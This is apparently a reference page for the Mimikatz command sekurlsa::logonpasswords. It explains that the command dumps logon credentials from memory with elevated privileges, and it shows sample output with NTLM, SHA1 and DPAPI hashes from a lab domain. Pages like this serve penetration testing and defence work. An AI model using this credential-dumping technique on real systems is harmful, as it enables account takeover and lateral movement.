# logonpasswords

It lists all available provider credentials. This usually shows recently logged on user and computer credentials.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 712960 (00000000:000ae100)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 9/26/2021 4:57:38 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427
        msv :
         [00000003] Primary
         * Username : MediaAdmin$
         * Domain   : hacklab
         * NTLM     : 35950fdc8d3d99b4136510414009662d
         * SHA1     : 185535108abf1fc0287dedbaff210b77989251c8
         * DPAPI    : 73006d59c6adcf27da6e097787a6d1f9
        tspkg :
        wdigest :
         * Username : MediaAdmin$
         * Domain   : hacklab
         * Password : (null)
        kerberos :
         * Username : MediaAdmin$
         * Domain   : HACKLAB.LOCAL
         * Password : (null)
        ssp :
        credman :
```
